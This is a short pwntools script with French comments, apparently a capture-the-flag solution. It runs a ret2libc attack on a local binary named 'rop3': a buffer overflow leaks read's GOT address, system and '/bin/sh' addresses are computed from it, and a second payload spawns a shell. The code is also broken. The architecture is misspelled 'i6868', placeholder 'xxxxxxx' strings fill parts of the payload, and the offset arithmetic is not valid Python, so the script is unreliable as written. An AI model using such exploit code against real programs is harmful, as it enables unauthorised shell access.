from pwn import *
context(arch="i6868",os="linux")
#PLT, pour Procedure Linkage Table, est une table sertvant à faire le lien avec les fonctions situées dans des bibliothèques dynamiques.

#write(1,address_read_GOT,4)
#leak = buffer + <adress_write> + <adress_vulnerable_function> + 1 + <adress_read>

leak = "A"*140 + "xxxxxxx" + "\x74\x84\x04\x08" + "\x01\x00\x00\x00" + "xxxxxxx" + "\x04\x00\x00\x00"


exploit = process("./rop3",shell=True)
exploit.sendline(leak)
read_addr = unpack(exploit.recv(4))
print ("[+] Lecture a: "+hex(read_addr))


#calcul à partir de readadress de la fonction system et de la chiane binsh
system_address=read_addr-xxxxxx
binsh_address = read_addr+xxxxxxx

exploit.sendline(b"A"*140+pack(system_address)+b"JUNK"+pack(binsh_address))

exploit.interactive()
